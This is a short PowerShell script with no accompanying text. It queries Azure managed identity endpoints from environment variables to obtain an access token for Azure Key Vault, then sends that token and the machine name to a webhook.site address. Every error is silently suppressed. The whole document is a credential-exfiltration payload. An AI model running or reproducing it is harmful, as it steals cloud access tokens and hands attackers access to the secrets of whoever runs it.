$wh = 'https://webhook.site/<GUID>'; $resource = 'https://vault.azure.net'; $ie = $env:IDENTITY_ENDPOINT; $ih = $env:IDENTITY_HEADER; $me = $env:MSI_ENDPOINT; $ms = $env:MSI_SECRET; $token = $null; try { if ($ie) { $r = Invoke-RestMethod -UseBasicParsing -Method GET -Uri ($ie + "?resource=$resource&api-version=2019-08-01") -Headers @{ 'X-IDENTITY-HEADER' = $ih }; $token = $r.access_token } } catch {} if (-not $token) { try { if ($me) { $r = Invoke-RestMethod -UseBasicParsing -Method GET -Uri ($me + "?resource=$resource&api-version=2017-09-01") -Headers @{ 'Secret' = $ms }; $token = $r.access_token } } catch {} } $body = @{ host = $env:COMPUTERNAME; ok = [bool]$token; token = $token } try { Invoke-WebRequest -UseBasicParsing -Method POST -Uri $wh -ContentType 'application/x-www-form-urlencoded' -Body $body | Out-Null } catch {}
